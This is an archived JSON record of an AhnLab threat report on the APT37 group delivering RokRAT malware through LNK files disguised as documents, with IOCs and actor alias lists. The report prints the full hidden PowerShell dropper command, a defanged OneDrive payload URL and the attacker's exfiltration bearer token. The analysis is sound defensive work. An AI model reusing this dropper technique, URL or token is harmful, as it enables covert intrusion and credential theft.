{
    "id": "8c813e7b-dfae-4b55-8df5-0e7c62264151",
    "created_at": "2023-05-06T02:08:32.335714Z",
    "updated_at": "2024-11-22T02:03:50.710677Z",
    "deleted_at": null,
    "sha1_hash": "7560b63abac99a9c28a46a93a605ed39183ecca0",
    "title": "2023-04-26 - RokRAT Malware Distributed Through LNK Files (.lnk)- RedEyes (ScarCruft)",
    "authors": "",
    "file_creation_date": "2023-05-05T02:06:32Z",
    "file_modification_date": "2023-05-05T02:06:32Z",
    "file_size": 2788928,
    "plain_text": "RokRAT Malware Distributed Through LNK Files (*.lnk): RedEyes (ScarCruft)\nasec.ahnlab.com/en/51751/\nBy bghjmun\n\nApril 26, 2023\n\nAhnLab Security Emergency response Center (ASEC) confirmed that the RedEyes threat group (also known as APT37, ScarCruft), which\ndistributed CHM Malware Disguised as Security Email from a Korean Financial Company last month, has also recently distributed the RokRAT\nmalware through LNK files.\nRokRAT is malware that is capable of collecting user credentials and downloading additional malware. The malware was once distributed\nthrough HWP and Word files. The LNK files that were discovered this time contain PowerShell commands that can perform malicious behavior\nby creating and executing a script file along with a normal file in the temp folder. The confirmed LNK filenames are as follows:\n230407Infosheet.lnk\nApril 29th 2023 Seminar.lnk\n2023 Personal Evaluation.hwp.lnk\nNK Diplomat Dispatch Selection and Diplomatic Offices.lnk\nNK Diplomacy Policy Decision Process.lnk\nThe \u201c230407Infosheet.lnk\u201d file is disguised with a PDF icon and contains a malicious PowerShell command.\n\n1/7\n\nFigure 1. Properties of the LNK file\n\nThe LNK file contains not only a PowerShell command, but also the data of a normal PDF file along with malicious script codes. Furthermore,\nthere are dummy bytes that start from 0x89D9A all the way to 0x141702A.\n\nFigure 2. Dummy\n\ndata that exists at the end of the LNK file\n\nThe PowerShell command that is executed through cmd.exe upon executing the LNK file is as follows:\n/c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match \u2018System32\u2019 -or $dirPath -Match \u2018Program Files\u2019) {\n$dirPath = \u2018%temp%\u2019\n}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x00014A0DC4} ^|\nSelect-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00561396 -ReadCount 00561396; $pdfPath =\n\u2018%temp%\\230407\uc815\ubcf4\uc9c0.pdf\u2019; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002474)) -Encoding Byte; ^& $pdfPath; $exeFile = gc $lnkpath Encoding Byte -TotalCount 00564634 -ReadCount 00564634; $exePath = \u2018%temp%\\230412.bat\u2019; sc $exePath ([byte[]]($exeFile ^| select Skip 00561396)) -Encoding Byte; ^& $exePath;\nThe LNK file is read up to 0x890F4 and is saved and executed with the filename \u201c230407Infosheet.pdf\u201d in the Temp folder while excluding the\nfirst 0x9AA. Afterward, it reads up to 0x89D9A of the LNK file and is saved and executed in the Temp folder with the filename \u201c230412.bat\u201d\nafter excluding 0x890F4, which is the byte where the PDF data exists.\n\n2/7\n\nFigure 3. PDF data\n\nlocated at 0x9AA of the LNK file\n\nFigure 4. Script code\n\nlocated at 0x890F4 of the LNK file\n\nFigure 5. Files created\n\nin the Temp folder\n\nThe threat actor executes a normal PDF file to make the behavior appear normal before carrying out their malicious behavior through the script\nfile.\n\n3/7\n\nFigure 6.\n\n230407Infosheet.pdf (normal file)\n\nThe script file executed at the same time contains the following PowerShell command that executes malicious commands which exist as HEX\nvalues.\n\nFigure 7. 230412.bat\n\nThe final PowerShell command that is executed downloads the encoded data from\nhxxps://api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRiZnpnVU14TmJJbkM2Q0k_ZT1WZElLSjE/roo\ndecodes it, and injects it into the PowerShell process to perform malicious behavior.\n\n4/7\n\nFigure 8. Final\n\nPowerShell command that is executed\n\nFigure 9. Malicious\n\nfile uploaded to OneDrive\n\nThe injected data is the RokRAT malware that is capable of collecting user credentials and downloading additional malware. The collected\ninformation is sent to the threat actor\u2019s cloud server using cloud services such as pcloud and yandex. The UserAgent in the request header is\ndisguised as Googlebot. The certificate token used to send files is as follows:\nAuthorization: Bearer RSbj7Zk5IYK5ThSbQZH4YBo7ZxiPOCH94RBbFuU9c04XXVJg7xbvX\nThe additional normal files executed through the malicious LNK are as follows:\n\n5/7\n\nFigure 10. April\n\n29th 2023 Seminar.pdf created through April 29th 2023 Seminar.lnk\n\nFigure 11.\n\n230402.hwp created through NK Diplomacy Policy Decision Process.lnk\n\nAs RokRAT has been in distribution for a while and is being distributed in various forms such as Word files, users are advised to take extra\ncaution.\nReddoor (RokRAT) Malware Analysis Report \u2013 May 9, 2022\nKorean APT Attacks Using Ruby Script Analysis Report \u2013 Apr. 7, 2021\n\n6/7\n\n[File Detection]\nDropper/LNK.Agent (2023.04.08.00)\nDownloader/BAT.Agent (2023.04.08.00)\n[IOC]\n0f5eeb23d701a2b342fc15aa90d97ae0 (LNK)\naa8ba9a029fa98b868be66b7d46e927b (LNK)\n657fd7317ccde5a0e0c182a626951a9f (LNK)\nbe32725e676d49eaa11ff51c61f18907 (LNK)\n8fef5eb77e0a9ef2f97591d4d150a363 (bat)\n461ce7d6c6062d1ae33895d1f44d98fb (bat)\nhxxps://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL2kvcyFBaFhFWExKU05NUFRiZnpnVU14TmJJbkM2Q0k_ZT1WZElLSjE/root/\nSubscribe to AhnLab\u2019s next-generation threat intelligence platform \u2018AhnLab TIP\u2019 to check related IOC and detailed analysis\ninformation.\nCategories:Malware Information\nTagged as:APT37,lnk,RedEyes,RokRAT,ScarCruft\n\n7/7",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-26 - RokRAT Malware Distributed Through LNK Files (.lnk)- RedEyes (ScarCruft).pdf"
    ],
    "report_names": [
        "2023-04-26 - RokRAT Malware Distributed Through LNK Files (.lnk)- RedEyes (ScarCruft).pdf"
    ],
    "threat_actors": [
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2024-11-22T02:00:52.337241Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2024-11-22T02:00:02.573104Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "Operation Erebus",
                "Operation Daybreak",
                "Group123",
                "Reaper Group",
                "Ricochet Chollima",
                "G0067",
                "Group 123",
                "ScarCruft",
                "Venus 121",
                "APT 37",
                "Red Eyes",
                "ATK4",
                "Moldy Pisces",
                "TA-RedAnt",
                "InkySquid"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2024-11-22T02:02:53.098302Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2024-11-22T02:02:01.154803Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338912335,
    "ts_updated_at": 1732241030710,
    "ts_creation_date": 1683252392000,
    "ts_modification_date": 1683252392000,
    "files": {
        "pdf": "https://archive.orkl.eu/7560b63abac99a9c28a46a93a605ed39183ecca0.pdf",
        "text": "https://archive.orkl.eu/7560b63abac99a9c28a46a93a605ed39183ecca0.txt",
        "img": "https://archive.orkl.eu/7560b63abac99a9c28a46a93a605ed39183ecca0.jpg"
    }
}